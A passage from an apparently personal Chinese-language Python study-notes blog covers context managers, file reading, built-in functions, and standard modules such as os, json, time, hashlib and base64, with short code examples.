<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Networkerror</span>(<span class="title class_ inherited__">RuntimeError</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, arg</span>):</span><br><span class="line">        self.args = arg</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Networkerror(<span class="string">&quot;Bad hostname&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Networkerror,e:</span><br><span class="line">    <span class="built_in">print</span>(e.args)</span><br></pre></td></tr></table></figure>

<h2 id="8-with-上下文"><a href="#8-with-上下文" class="headerlink" title="8. with 上下文"></a>8. with 上下文</h2><h3 id="with是什么"><a href="#with是什么" class="headerlink" title="with是什么"></a>with是什么</h3><p>with处理相当于<code>try-finally</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/foo.txt&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = file.read()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/foo.txt&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br></pre></td></tr></table></figure>

<h3 id="with怎么工作"><a href="#with怎么工作" class="headerlink" title="with怎么工作"></a>with怎么工作</h3><p>基本思想是with所求值的对象必须有一个<code>__enter__()</code>方法，一个<code>__exit__()</code>方法。</p>
<p>紧跟with后面的语句被求值后，返回对象的<code>__enter__()</code>方法被调用，这个方法的返回值将被赋值给as后面的变量。当with后面的代码块全部被执行完之后，将调用前面返回对象的<code>__exit__()</code>方法。</p>
<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># with_example01.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sample</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;In __enter__()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Foo&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, <span class="built_in">type</span>, value, trace</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;In __exit__()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sample</span>():</span><br><span class="line">    <span class="keyword">return</span> Sample()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> get_sample() <span class="keyword">as</span> sample:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;sample:&quot;</span>, sample</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In __enter__()</span><br><span class="line">sample: Foo</span><br><span class="line">In __exit__()</span><br></pre></td></tr></table></figure>

<h2 id="9-print-打印操作"><a href="#9-print-打印操作" class="headerlink" title="9. print 打印操作"></a>9. print 打印操作</h2><h3 id="9-1-一些基本操作"><a href="#9-1-一些基本操作" class="headerlink" title="9.1. 一些基本操作"></a>9.1. 一些基本操作</h3><ul>
<li><code>\r</code>: 将光标定位到行首</li>
<li><code>\b</code>: 光标前移一个字符</li>
<li><code>end=&quot;&quot;</code>: 参数end控制结束符</li>
</ul>
<h2 id="10-import-导入模块"><a href="#10-import-导入模块" class="headerlink" title="10. import 导入模块"></a>10. import 导入模块</h2><ul>
<li>导入会先找脚本所在同级目录，再去找系统path下</li>
</ul>
<h3 id="10-1-使用字符串导入"><a href="#10-1-使用字符串导入" class="headerlink" title="10.1. 使用字符串导入"></a>10.1. 使用字符串导入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mod_name = <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="comment"># __import__方法</span></span><br><span class="line"><span class="built_in">__import__</span>(mod_name)</span><br><span class="line"><span class="comment"># exec的方法</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;import &#x27;</span> + mod_name)</span><br><span class="line"><span class="comment"># import_module 官方推荐</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">string = importlib.import_module(mod_name)</span><br></pre></td></tr></table></figure>

<h2 id="11-文件操作"><a href="#11-文件操作" class="headerlink" title="11. 文件操作"></a>11. 文件操作</h2><h3 id="11-1-文件读取"><a href="#11-1-文件读取" class="headerlink" title="11.1. 文件读取"></a>11.1. 文件读取</h3><ul>
<li>读取成字符串，使用<code>r</code></li>
<li>读取成二进制，使用<code>rb</code></li>
</ul>
<h4 id="1-read-方法"><a href="#1-read-方法" class="headerlink" title="(1) read()方法"></a>(1) read()方法</h4><ul>
<li>返回string到变量中，会读取所有内容</li>
<li>比较占用内存</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br></pre></td></tr></table></figure>

<h4 id="2-readline-方法"><a href="#2-readline-方法" class="headerlink" title="(2) readline()方法"></a>(2) readline()方法</h4><ul>
<li>每次只读一行</li>
<li>比较慢</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        <span class="built_in">print</span> line</span><br><span class="line">        line = f.readline()</span><br></pre></td></tr></table></figure>

<h4 id="3-readlines-方法"><a href="#3-readlines-方法" class="headerlink" title="(3) readlines()方法"></a>(3) readlines()方法</h4><ul>
<li>一次全部读取，按照换行返回list</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line)         <span class="comment"># line带&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-直接对f进行遍历"><a href="#4-直接对f进行遍历" class="headerlink" title="(4) 直接对f进行遍历"></a>(4) 直接对f进行遍历</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            do_somthing_with(line)      <span class="comment"># line带&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>

<h2 id="12-内置函数"><a href="#12-内置函数" class="headerlink" title="12. 内置函数"></a>12. 内置函数</h2><h3 id="1-进制转换"><a href="#1-进制转换" class="headerlink" title="(1) 进制转换"></a>(1) 进制转换</h3><p><strong>10进制转其他进制</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">446</span>)</span><br><span class="line"><span class="string">&#x27;0x1be&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">446</span>)</span><br><span class="line"><span class="string">&#x27;0b110111110&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">oct</span>(<span class="number">446</span>)</span><br><span class="line"><span class="string">&#x27;0o676&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>其他进制转10进制</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;0x1be&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"><span class="number">446</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;0o676&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="number">446</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;0b110111110&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">446</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="number">0x1be</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line"><span class="number">446</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="number">0o676</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line"><span class="number">446</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="number">0b110111110</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line"><span class="number">446</span></span><br></pre></td></tr></table></figure>

<h3 id="2-locals-获取本地变量dict"><a href="#2-locals-获取本地变量dict" class="headerlink" title="(2) locals() 获取本地变量dict"></a>(2) locals() 获取本地变量dict</h3><p><strong>判断变量是否定义</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;aaa&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>().keys():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aaa is defined&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="3-isinstance-类型比较函数"><a href="#3-isinstance-类型比较函数" class="headerlink" title="(3) isinstance() 类型比较函数"></a>(3) isinstance() 类型比较函数</h3><ul>
<li>pylint不建议使用<code>type(xxx) == type(&quot;&quot;)</code>的格式判断特定的类型</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="string">&quot;aaa&quot;</span>, <span class="built_in">str</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h2 id="13-dict操作"><a href="#13-dict操作" class="headerlink" title="13. dict操作"></a>13. dict操作</h2><h3 id="1-dict合并"><a href="#1-dict合并" class="headerlink" title="1) dict合并"></a>1) dict合并</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict2 = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">2</span>, <span class="string">&quot;c&quot;</span>: <span class="number">3</span>&#125;</span><br><span class="line">dict3 = &#123;**dict1, **dict2&#125;  <span class="comment"># 用dict2更新dict1</span></span><br></pre></td></tr></table></figure>

<h3 id="2-遍历"><a href="#2-遍历" class="headerlink" title="2) 遍历"></a>2) 遍历</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="comment"># do something</span></span><br></pre></td></tr></table></figure>

<h2 id="14-bytes-字节序列"><a href="#14-bytes-字节序列" class="headerlink" title="14. bytes 字节序列"></a>14. bytes 字节序列</h2><h3 id="14-1-和str相互转化"><a href="#14-1-和str相互转化" class="headerlink" title="14.1. 和str相互转化"></a>14.1. 和str相互转化</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base64data.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">str_data = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(str_data)</span><br><span class="line">bytes_data = str_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(bytes_data)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;1234&#x27;</span><br><span class="line">1234</span><br><span class="line">b&#x27;1234&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="三、系统内置module介绍"><a href="#三、系统内置module介绍" class="headerlink" title="三、系统内置module介绍"></a>三、系统内置module介绍</h1><h2 id="1-操作系统组件-os"><a href="#1-操作系统组件-os" class="headerlink" title="1. 操作系统组件 os"></a>1. 操作系统组件 os</h2><h3 id="1-1-路径相关操作"><a href="#1-1-路径相关操作" class="headerlink" title="1.1. 路径相关操作"></a>1.1. 路径相关操作</h3><h4 id="1-获取当前路径"><a href="#1-获取当前路径" class="headerlink" title="(1) 获取当前路径"></a>(1) 获取当前路径</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.getcwd())                  <span class="comment">#获取当前工作目录路径</span></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(<span class="string">&#x27;.&#x27;</span>))         <span class="comment">#获取当前工作目录路径</span></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(<span class="string">&#x27;test.txt&#x27;</span>))  <span class="comment">#获取当前目录文件下的工作目录路径</span></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(<span class="string">&#x27;..&#x27;</span>))        <span class="comment">#获取当前工作的父目录 ！注意是父目录路径</span></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(os.curdir))   <span class="comment">#获取当前工作目录路径</span></span><br></pre></td></tr></table></figure>

<h4 id="2-改变当前路径"><a href="#2-改变当前路径" class="headerlink" title="(2) 改变当前路径"></a>(2) 改变当前路径</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(path)</span><br></pre></td></tr></table></figure>

<h4 id="3-遍历目录"><a href="#3-遍历目录" class="headerlink" title="(3) 遍历目录"></a>(3) 遍历目录</h4><p>此命令会遍历目录下的所有文件包括子文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirPath, dirNames, fileNames <span class="keyword">in</span> os.walk(<span class="string">&#x27;./&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dirPath&#x27;</span>, dirPath)       <span class="comment"># 当前遍历的目录</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dirNames&#x27;</span>, dirNames)     <span class="comment"># 该目录下所有的文件夹名字组成的列表</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fileNames&#x27;</span>, fileNames)   <span class="comment"># 该目录下所有的文件名字组成的列表</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-调用可执行文件"><a href="#1-2-调用可执行文件" class="headerlink" title="1.2. 调用可执行文件"></a>1.2. 调用可执行文件</h3><h4 id="1-获取输出结果"><a href="#1-获取输出结果" class="headerlink" title="(1) 获取输出结果"></a>(1) 获取输出结果</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = os.popen(<span class="string">&quot;(cmd) (param)&quot;</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h4 id="2-获取返回值"><a href="#2-获取返回值" class="headerlink" title="(2) 获取返回值"></a>(2) 获取返回值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r_v = os.system(<span class="string">&quot;(cmd) (param)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> r_v</span><br></pre></td></tr></table></figure>

<h2 id="2-系统组件-sys"><a href="#2-系统组件-sys" class="headerlink" title="2. 系统组件 sys"></a>2. 系统组件 sys</h2><h3 id="内置常量"><a href="#内置常量" class="headerlink" title="内置常量"></a>内置常量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.executable)       <span class="comment"># 当前python命令所在路径，/usr/bin/python</span></span><br></pre></td></tr></table></figure>

<h2 id="3-json"><a href="#3-json" class="headerlink" title="3. json"></a>3. json</h2><h3 id="3-1-json-loads-字符串转dict"><a href="#3-1-json-loads-字符串转dict" class="headerlink" title="3.1. json.loads() 字符串转dict"></a>3.1. json.loads() 字符串转dict</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串到dict</span></span><br><span class="line">dict_data = json.loads(<span class="string">&#x27;&#123;&quot;a&quot;: 1&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="3-2-json-dumps-dict转json"><a href="#3-2-json-dumps-dict转json" class="headerlink" title="3.2. json.dumps() dict转json"></a>3.2. json.dumps() dict转json</h3><p><strong>原型</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">obj, *, skipkeys=<span class="literal">False</span>, ensure_ascii=<span class="literal">True</span>, check_circular=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">        allow_nan=<span class="literal">True</span>, cls=<span class="literal">None</span>, indent=<span class="literal">None</span>, separators=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        default=<span class="literal">None</span>, sort_keys=<span class="literal">False</span>, **kw</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Serialize ``obj`` to a JSON formatted ``str``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If ``skipkeys`` is true then ``dict`` keys that are not basic types</span></span><br><span class="line"><span class="string">    (``str``, ``int``, ``float``, ``bool``, ``None``) will be skipped</span></span><br><span class="line"><span class="string">    instead of raising a ``TypeError``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If ``ensure_ascii`` is false, then the return value can contain non-ASCII</span></span><br><span class="line"><span class="string">    characters if they appear in strings contained in ``obj``. Otherwise, all</span></span><br><span class="line"><span class="string">    such characters are escaped in JSON strings.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If ``check_circular`` is false, then the circular reference check</span></span><br><span class="line"><span class="string">    for container types will be skipped and a circular reference will</span></span><br><span class="line"><span class="string">    result in an ``OverflowError`` (or worse).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If ``allow_nan`` is false, then it will be a ``ValueError`` to</span></span><br><span class="line"><span class="string">    serialize out of range ``float`` values (``nan``, ``inf``, ``-inf``) in</span></span><br><span class="line"><span class="string">    strict compliance of the JSON specification, instead of using the</span></span><br><span class="line"><span class="string">    JavaScript equivalents (``NaN``, ``Infinity``, ``-Infinity``).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If ``indent`` is a non-negative integer, then JSON array elements and</span></span><br><span class="line"><span class="string">    object members will be pretty-printed with that indent level. An indent</span></span><br><span class="line"><span class="string">    level of 0 will only insert newlines. ``None`` is the most compact</span></span><br><span class="line"><span class="string">    representation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If specified, ``separators`` should be an ``(item_separator, key_separator)``</span></span><br><span class="line"><span class="string">    tuple.  The default is ``(&#x27;, &#x27;, &#x27;: &#x27;)`` if *indent* is ``None`` and</span></span><br><span class="line"><span class="string">    ``(&#x27;,&#x27;, &#x27;: &#x27;)`` otherwise.  To get the most compact JSON representation,</span></span><br><span class="line"><span class="string">    you should specify ``(&#x27;,&#x27;, &#x27;:&#x27;)`` to eliminate whitespace.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ``default(obj)`` is a function that should return a serializable version</span></span><br><span class="line"><span class="string">    of obj or raise TypeError. The default simply raises TypeError.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If *sort_keys* is true (default: ``False``), then the output of</span></span><br><span class="line"><span class="string">    dictionaries will be sorted by key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    To use a custom ``JSONEncoder`` subclass (e.g. one that overrides the</span></span><br><span class="line"><span class="string">    ``.default()`` method to serialize additional types), specify it with</span></span><br><span class="line"><span class="string">    the ``cls`` kwarg; otherwise ``JSONEncoder`` is used.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>实例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># dict到字符串，是否排列key</span></span><br><span class="line">json_str = json.dumps(dict_data, sort_keys=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># dict到字符串，是否排列key，按照格式化输出，缩进为2，字符串原样输出，不转ascii</span></span><br><span class="line">json_str = json.dumps(dict_data, sort_keys=<span class="literal">True</span>, indent=<span class="number">2</span>, ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-加载C-C-的so库-ctypes"><a href="#4-加载C-C-的so库-ctypes" class="headerlink" title="4. 加载C&#x2F;C++的so库 ctypes"></a>4. 加载C&#x2F;C++的so库 ctypes</h2><h3 id="4-1-基本操作"><a href="#4-1-基本操作" class="headerlink" title="4.1. 基本操作"></a>4.1. 基本操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-时间库-time"><a href="#5-时间库-time" class="headerlink" title="5. 时间库 time"></a>5. 时间库 time</h2><h3 id="5-1-当前时间操作"><a href="#5-1-当前时间操作" class="headerlink" title="5.1. 当前时间操作"></a>5.1. 当前时间操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> time</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(time.time())</span><br><span class="line"><span class="number">1641548351.8147426</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>time.strftime(<span class="string">&quot;%Y-%m-%d %X&quot;</span>)</span><br><span class="line"><span class="string">&#x27;2022-01-07 17:39:38&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-struct-time操作"><a href="#5-2-struct-time操作" class="headerlink" title="5.2. struct_time操作"></a>5.2. struct_time操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">########## struct_time创建 ##########</span></span><br><span class="line"><span class="comment"># 时间字符串转struct_time</span></span><br><span class="line">time_s = time.strptime(<span class="string">&quot;2020-01-02 19:00:00&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment"># 时间戳转struct_time</span></span><br><span class="line">time_s = time.localtime(<span class="number">1577962800.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">########## struct_time转其他 ##########</span></span><br><span class="line"><span class="comment"># 转时间戳，ms</span></span><br><span class="line">timestamp_float = time.mktime(time_s)</span><br><span class="line">timestamp_s = <span class="built_in">int</span>(timestamp_float)</span><br><span class="line"><span class="comment"># 转时间字符串</span></span><br><span class="line">time_str = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time_s)</span><br></pre></td></tr></table></figure>

<h3 id="5-3-sleep-睡眠"><a href="#5-3-sleep-睡眠" class="headerlink" title="5.3. sleep 睡眠"></a>5.3. sleep 睡眠</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 睡眠1.5s</span></span><br><span class="line">time.sleep(<span class="number">1.5</span>)</span><br></pre></td></tr></table></figure>

<h2 id="6-math-数学库"><a href="#6-math-数学库" class="headerlink" title="6. math 数学库"></a>6. math 数学库</h2><h3 id="6-1-取整"><a href="#6-1-取整" class="headerlink" title="6.1. 取整"></a>6.1. 取整</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 向下</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.floor(<span class="number">2.9</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># 向上</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.ceil(<span class="number">2.1</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="comment"># 四舍五入，2.5可能认为是2.49999999</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2.5</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2.6</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="7-hashlib-hash算法库"><a href="#7-hashlib-hash算法库" class="headerlink" title="7. hashlib hash算法库"></a>7. hashlib hash算法库</h2><h3 id="7-1-sha256"><a href="#7-1-sha256" class="headerlink" title="7.1. sha256"></a>7.1. sha256</h3><h4 id="1-计算文件的sha256值"><a href="#1-计算文件的sha256值" class="headerlink" title="(1) 计算文件的sha256值"></a>(1) 计算文件的sha256值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">sha256_handle = hashlib.sha256()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    sha256_handle.update(f.read())</span><br><span class="line">    hash_value = sha256_handle.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hash_value)</span><br></pre></td></tr></table></figure>

<h2 id="8-functools-内置的一些函数"><a href="#8-functools-内置的一些函数" class="headerlink" title="8. functools 内置的一些函数"></a>8. functools 内置的一些函数</h2><h3 id="8-1-reduce"><a href="#8-1-reduce" class="headerlink" title="8.1. reduce"></a>8.1. reduce</h3><ul>
<li>就是python2的reduce</li>
<li>第一个x和y为前两个元素，计算结果作为下一个x，下一个元素作为y</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> functools</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = functools.reduce(<span class="keyword">lambda</span> x, y: x + y, a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(result)</span><br><span class="line"><span class="number">21</span></span><br></pre></td></tr></table></figure>

<h2 id="9-base64-库"><a href="#9-base64-库" class="headerlink" title="9. base64 库"></a>9. base64 库</h2><h3 id="9-1-base64编码解码"><a href="#9-1-base64编码解码" class="headerlink" title="9.1. base64编码解码"></a>9.1. base64编码解码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 使用base64加密，得到的是bytes类型的数据</span></span><br><span class="line">    base64EncData = base64.b64encode(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base64data.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 由于是bytes数据，需要使用二进制保存，但是存进去后打开是可读的字符串</span></span><br><span class="line">    f.write(base64EncData)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test1.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 解码后存到文件中</span></span><br><span class="line">    f.write(base64.b64decode(base64EncData))</span><br></pre></td></tr></table></figure>

<h1 id="四、好用的module推荐"><a href="#四、好用的module推荐" class="headerlink" title="四、好用的module推荐"></a>四、好用的module推荐</h1><h2 id="module对应pack"><a href="#module对应pack" class="headerlink" title="module对应pack"></a>module对应pack</h2><table>
<thead>
<tr>
<th>module</th>
<th>pack</th>
</tr>
</thead>
<tbody><tr>
<td>cv2</td>
<td>opencv-python</td>
</tr>
<tr>
<td>PIL</td>
<td>pillow</td>
</tr>
<tr>
<td>dns</td>
<td>dnspython</td>
</tr>
</tbody></table>
